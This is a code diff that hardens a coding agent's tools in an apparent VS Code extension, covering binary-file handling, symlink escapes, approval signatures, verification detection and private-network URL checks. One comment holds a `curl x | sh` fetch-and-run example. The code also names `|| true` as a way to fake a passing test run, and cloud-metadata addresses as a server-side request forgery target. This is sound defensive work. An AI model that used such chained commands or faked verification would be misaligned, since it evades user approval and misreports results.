@@ -713,6 +713,11 @@ async function readFile(target: WorkspacePath, offset?: number, limit?: number, 
 		}
 		throw err;
 	}
+	// A NUL byte in the first chunk means a binary file; decoding it would hand the model
+	// replacement-character noise it may then try to "fix" with a write.
+	if (bytes.subarray(0, 8_000).includes(0)) {
+		return { result: `${path} looks like a binary file (it contains NUL bytes), so read_file will not show it as text.`, isError: true };
+	}
 	// `stream: true` keeps a multi-byte sequence straddling the cut from decoding as U+FFFD.
 	const decodeLimit = Math.max(MAX_DECODE_BYTES, maxChars);
 	const partial = bytes.byteLength > decodeLimit;
@@ -1022,15 +1027,33 @@ export function renderDiff(before: string, after: string): string {
 	return lines.join('\n');
 }
 
-/** Reads a file's current text, or undefined when it doesn't exist yet. */
+/** Marker for {@link readIfExists}: the file exists but is not valid UTF-8 text. */
+class NotUtf8Error extends Error {}
+
+/** The tool error for a file {@link readIfExists} could not decode. */
+function notUtf8Result(path: string): ToolResult {
+	return { result: `${path} is not valid UTF-8 text (it may be binary or use another encoding), so it was left untouched. Rewriting it would corrupt it.`, isError: true };
+}
+
+/**
+ * Reads a file's current text, or undefined when it doesn't exist yet. Throws
+ * {@link NotUtf8Error} for an existing file that is not valid UTF-8: a lossy decode would
+ * write replacement characters back over the original bytes.
+ */
 async function readIfExists(uri: vscode.Uri): Promise<string | undefined> {
+	let bytes: Uint8Array;
+	try {
+		bytes = await vscode.workspace.fs.readFile(uri);
+	} catch {
+		return undefined;
+	}
 	try {
 		// `ignoreBOM` keeps a leading U+FEFF in the text instead of silently dropping it, so an
 		// edit written back out keeps the file's BOM (PowerShell 5 and several Windows tools
 		// read a BOM-less file as the wrong encoding).
-		return new TextDecoder('utf-8', { ignoreBOM: true }).decode(await vscode.workspace.fs.readFile(uri));
+		return new TextDecoder('utf-8', { ignoreBOM: true, fatal: true }).decode(bytes);
 	} catch {
-		return undefined;
+		throw new NotUtf8Error();
 	}
 }
 
@@ -1065,14 +1088,36 @@ async function linkEscape(target: WorkspacePath): Promise<string | undefined> {
 	} catch {
 		return undefined;
 	}
+	const blocked = (real: string): string => `Writing ${target.display} is blocked: it resolves through a link to ${real}, outside the workspace.`;
+	let hops = 0;
 	for (let probe = target.uri.fsPath; ;) {
 		try {
 			const real = await fsp.realpath(probe);
 			const rel = nodePath.relative(root, real);
 			return rel === '..' || rel.startsWith(`..${nodePath.sep}`) || nodePath.isAbsolute(rel)
-				? `Writing ${target.display} is blocked: it resolves through a link to ${real}, outside the workspace.`
+				? blocked(real)
 				: undefined;
 		} catch {
+			// realpath fails for a dangling link too, and climbing to the parent would then
+			// approve a write that creates the link's target. Look at the probe itself.
+			let info: import('node:fs').Stats | undefined;
+			try {
+				info = await fsp.lstat(probe);
+			} catch {
+				info = undefined;
+			}
+			if (info) {
+				if (!info.isSymbolicLink() || ++hops > 40) {
+					return `Writing ${target.display} is blocked: ${probe} could not be resolved safely.`;
+				}
+				const dest = nodePath.resolve(nodePath.dirname(probe), await fsp.readlink(probe));
+				const rel = nodePath.relative(root, dest);
+				if (rel === '..' || rel.startsWith(`..${nodePath.sep}`) || nodePath.isAbsolute(rel)) {
+					return blocked(dest);
+				}
+				probe = dest;
+				continue;
+			}
 			const parent = nodePath.dirname(probe);
 			if (parent === probe) {
 				return undefined;
@@ -1088,7 +1133,15 @@ async function writeFile(target: WorkspacePath, content: string, approver: ToolA
 	if (escape) {
 		return { result: escape, isError: true };
 	}
-	const existing = await readIfExists(target.uri);
+	let existing: string | undefined;
+	try {
+		existing = await readIfExists(target.uri);
+	} catch (err) {
+		if (err instanceof NotUtf8Error) {
+			return notUtf8Result(path);
+		}
+		throw err;
+	}
 	// A drastic shrink is never auto-approved, whatever the policy says: it is the
 	// signature of a truncated model response, and the write is not reversible.
 	const suspicious = existing !== undefined
@@ -1104,7 +1157,9 @@ async function writeFile(target: WorkspacePath, content: string, approver: ToolA
 			kind: 'write',
 			// Keyed by the resolved path, so "always allow" cannot be widened by spelling the
 			// same file differently on the next call.
-			signature: `write_file:${path}`,
+			// A suspected truncation gets its own identity, so an earlier "always allow" on the
+			// path can neither skip this confirmation nor be created by answering it.
+			signature: suspicious ? `write_file:shrink:${path}:${content.length}` : `write_file:${path}`,
 			title: existing === undefined ? `Create ${path}?` : `Overwrite ${path}?`,
 			detail: existing === undefined
 				? `New file, ${content.split('\n').length} line(s).${shrink}`
@@ -1448,7 +1503,15 @@ async function editFile(target: WorkspacePath, edits: FileEdit[], approver: Tool
 	if (!edits.length) {
 		return { result: 'edit_file requires either oldText/newText or a non-empty "edits" array.', isError: true };
 	}
-	const current = await readIfExists(target.uri);
+	let current: string | undefined;
+	try {
+		current = await readIfExists(target.uri);
+	} catch (err) {
+		if (err instanceof NotUtf8Error) {
+			return notUtf8Result(path);
+		}
+		throw err;
+	}
 	if (current === undefined) {
 		return { result: `${path} does not exist, so there is nothing to edit. Use write_file to create it.`, isError: true };
 	}
@@ -1612,7 +1675,60 @@ const FRONT_ENDS: Record<string, keyof typeof VERIFY_SUBCOMMANDS> = {
  * that matters — the run then reports success over unverified code.
  */
 export function isVerificationCommand(command: string): boolean {
-	return command.split(/&&|\|\||[;|\n]/).some(isVerificationSegment);
+	const segments = splitShellSegments(command);
+	// `npm test || true` swallows the failure, so a red run would read as a pass.
+	if (segments.some(seg => seg.op === '||' && /^\s*(true|:|exit\s+0)\s*$/.test(seg.next))) {
+		return false;
+	}
+	return segments.some(seg => isVerificationSegment(seg.text));
+}
+
+/**
+ * Splits a command line on `&&`, `||`, `;`, `|` and newlines that are outside quotes.
+ * Each segment carries the operator that follows it and the text of the next segment.
+ */
+function splitShellSegments(command: string): Array<{ text: string; op: string; next: string }> {
+	const texts: string[] = [];
+	const ops: string[] = [];
+	let current = '';
+	let quote = '';
+	for (let i = 0; i < command.length; i++) {
+		const ch = command[i];
+		if (quote) {
+			current += ch;
+			if (ch === '\\' && quote === '"' && i + 1 < command.length) {
+				current += command[++i];
+			} else if (ch === quote) {
+				quote = '';
+			}
+			continue;
+		}
+		if (ch === '\\' && i + 1 < command.length) {
+			current += ch + command[++i];
+			continue;
+		}
+		if (ch === '"' || ch === '\'') {
+			quote = ch;
+			current += ch;
+			continue;
+		}
+		const two = command.slice(i, i + 2);
+		if (two === '&&' || two === '||') {
+			texts.push(current);
+			ops.push(two);
+			current = '';
+			i++;
+		} else if (ch === ';' || ch === '|' || ch === '\n') {
+			texts.push(current);
+			ops.push(ch);
+			current = '';
+		} else {
+			current += ch;
+		}
+	}
+	texts.push(current);
+	ops.push('');
+	return texts.map((text, i) => ({ text, op: ops[i], next: texts[i + 1] ?? '' }));
 }
 
 /** Whether one shell segment invokes a verification runner. */
@@ -1674,7 +1790,14 @@ const CMD_TAIL_CHARS = MAX_CMD_OUTPUT - CMD_HEAD_CHARS;
  * level at which a user actually means "yes, that kind of thing is fine".
  */
 export function commandSignature(command: string): string {
-	const words = command.trim().split(/\s+/).slice(0, 2).join(' ');
+	const trimmed = command.trim();
+	// Shell control characters chain or substitute further commands, so `git status; curl x | sh`
+	// must not share an identity with plain `git status`: such a command is remembered only
+	// as itself, whole.
+	if (/[;&|\n\r$`<>(){}]/.test(trimmed)) {
+		return `run_command:exact:${trimmed.replace(/\s+/g, ' ')}`;
+	}
+	const words = trimmed.split(/\s+/).slice(0, 2).join(' ');
 	return `run_command:${words.toLowerCase()}`;
 }
 
@@ -1785,13 +1908,19 @@ async function fetchUrl(rawUrl: string, raw: boolean, approver: ToolApprover, g:
 	if (url.protocol !== 'http:' && url.protocol !== 'https:') {
 		return { result: `fetch_url only speaks http and https, not "${url.protocol}". To read a local file use read_file.`, isError: true };
 	}
-	if (!autoApproves(g)) {
+	const privateStart = isPrivateHost(url.hostname);
+	if (privateStart || !autoApproves(g)) {
 		const { approved, feedback } = await approver.confirm({
 			kind: 'command',
 			// Per host, so approving one page of a docs site does not authorize the whole web.
-			signature: `fetch_url:${url.host}`,
-			title: 'Fetch a URL?',
-			detail: `The agent wants to read ${url.host} over the network.`,
+			// A loopback, link-local or private-network address is asked about under its own
+			// signature and under every policy, Full Auto included: it can reach cloud metadata
+			// and internal services that no remembered public-web approval was meant to cover.
+			signature: privateStart ? `fetch_url_private:${url.host}` : `fetch_url:${url.host}`,
+			title: privateStart ? 'Fetch a local or private-network URL?' : 'Fetch a URL?',
+			detail: privateStart
+				? `${url.host} is a loopback, link-local or private-network address (it may expose local services or cloud metadata).`
+				: `The agent wants to read ${url.host} over the network.`,
 			preview: url.toString(),
 			previewLanguage: 'text',
 		});
@@ -1841,12 +1970,13 @@ async function fetchUrl(rawUrl: string, raw: boolean, approver: ToolApprover, g:
 			if (next.protocol !== 'http:' && next.protocol !== 'https:') {
 				return { result: `${url} redirected to a ${next.protocol} address, which fetch_url does not follow.`, isError: true };
 			}
-			if (next.host !== url.host && !autoApproves(g)) {
+			const privateNext = isPrivateHost(next.hostname);
+			if (next.host !== url.host && (privateNext || !autoApproves(g))) {
 				const { approved, feedback } = await approver.confirm({
 					kind: 'command',
-					signature: `fetch_url:${next.host}`,
-					title: 'Follow a redirect to another host?',
-					detail: `${url.host} redirected the request to ${next.host}.`,
+					signature: privateNext ? `fetch_url_private:${next.host}` : `fetch_url:${next.host}`,
+					title: privateNext ? 'Follow a redirect to a local or private-network address?' : 'Follow a redirect to another host?',
+					detail: `${url.host} redirected the request to ${next.host}${privateNext ? ', a loopback, link-local or private-network address' : ''}.`,
 					preview: next.toString(),
 					previewLanguage: 'text',
 				});
@@ -1893,6 +2023,77 @@ async function fetchUrl(rawUrl: string, raw: boolean, approver: ToolApprover, g:
 		clearTimeout(timer);
 		signal?.removeEventListener('abort', stop);
 	}
+}
+
+/**
+ * Whether a URL hostname names this machine or a private network: loopback, link-local
+ * (including the 169.254.169.254 cloud metadata address), RFC 1918, carrier-grade NAT,
+ * IPv6 unique-local and link-local, and the usual local-only names. The WHATWG URL parser has
+ * already normalized decimal/hex/octal IPv4 spellings to dotted form. Names are judged by
+ * spelling only; a public name that resolves to a private address is not caught.
+ */
+export function isPrivateHost(hostname: string): boolean {
+	const host = hostname.toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, '');
+	if (!host) {
+		return false;
+	}
+	if (host === 'localhost' || host.endsWith('.localhost') || host.endsWith('.local') || host.endsWith('.internal') || host.endsWith('.localdomain')) {
+		return true;
+	}
+	const v4 = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(host);
+	if (v4) {
+		return isPrivateIPv4(v4.slice(1).map(Number));
+	}
+	if (!host.includes(':')) {
+		return false;
+	}
+	const groups = parseIPv6(host);
+	if (!groups) {
+		// Unparseable: treat as private so it is asked about rather than waved through.
+		return true;
+	}
+	// ::ffff:a.b.c.d (IPv4-mapped) and ::a.b.c.d (deprecated compatible) carry an IPv4 address.
+	if (groups.slice(0, 5).every(x => x === 0) && (groups[5] === 0xffff || groups[5] === 0)) {
+		return isPrivateIPv4([groups[6] >> 8, groups[6] & 255, groups[7] >> 8, groups[7] & 255]);
+	}
+	return (groups[0] & 0xfe00) === 0xfc00 || (groups[0] & 0xffc0) === 0xfe80 || (groups[0] & 0xffc0) === 0xfec0;
+}
+
+/** Whether four IPv4 octets fall in a non-public range. */
+function isPrivateIPv4([a, b, c]: number[]): boolean {
+	return a === 0 || a === 10 || a === 127 || a >= 224
+		|| (a === 100 && b >= 64 && b <= 127)
+		|| (a === 169 && b === 254)
+		|| (a === 172 && b >= 16 && b <= 31)
+		|| (a === 192 && b === 168)
+		|| (a === 192 && b === 0 && c === 0)
+		|| (a === 198 && (b === 18 || b === 19));
+}
+
+/** Expands an IPv6 literal (no brackets) into eight 16-bit groups, or undefined when malformed. */
+function parseIPv6(host: string): number[] | undefined {
+	let text = host.replace(/%.*$/, '');
+	const tail = /(\d+)\.(\d+)\.(\d+)\.(\d+)$/.exec(text);
+	if (tail) {
+		const o = tail.slice(1).map(Number);
+		if (o.some(n => n > 255)) {
+			return undefined;
+		}
+		text = text.slice(0, tail.index) + ((o[0] << 8) | o[1]).toString(16) + ':' + ((o[2] << 8) | o[3]).toString(16);
+	}
+	const halves = text.split('::');
+	if (halves.length > 2) {
+		return undefined;
+	}
+	const head = halves[0] ? halves[0].split(':') : [];
+	const rest = halves.length === 2 && halves[1] ? halves[1].split(':') : [];
+	const missing = 8 - head.length - rest.length;
+	if (halves.length === 1 ? missing !== 0 : missing < 1) {
+		return undefined;
+	}
+	const all = [...head, ...Array<string>(halves.length === 2 ? missing : 0).fill('0'), ...rest];
+	const groups = all.map(g => /^[0-9a-f]{1,4}$/.test(g) ? parseInt(g, 16) : NaN);
+	return groups.length === 8 && groups.every(n => !Number.isNaN(n)) ? groups : undefined;
 }
 
 /** Reads a response body as text, stopping once `maxBytes` have arrived. */
